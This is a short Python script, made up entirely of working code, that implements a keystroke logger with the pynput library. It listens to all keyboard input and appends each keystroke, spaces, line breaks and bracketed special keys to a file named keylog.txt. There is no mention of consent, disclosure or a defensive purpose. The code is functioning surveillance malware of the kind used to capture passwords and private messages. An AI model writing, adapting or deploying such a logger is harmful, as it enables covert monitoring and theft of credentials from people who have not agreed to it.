from pynput.keyboard import Key, Listener

# File to save the logs
log_file = "keylog.txt"

# Function to write keystrokes to the file
def write_to_file(key):
    with open(log_file, "a") as file:
        key = str(key).replace("'", "")  # Clean up formatting
        if key == "Key.space":
            file.write(" ")
        elif key == "Key.enter":
            file.write("\n")
        elif key.startswith("Key."):
            file.write(f"[{key.split('.')[-1]}]")  # Represent special keys
        else:
            file.write(key)

# Callback function for when a key is pressed
def on_press(key):
    write_to_file(key)

# Listener for the keyboard
with Listener(on_press=on_press) as listener:
    listener.join()
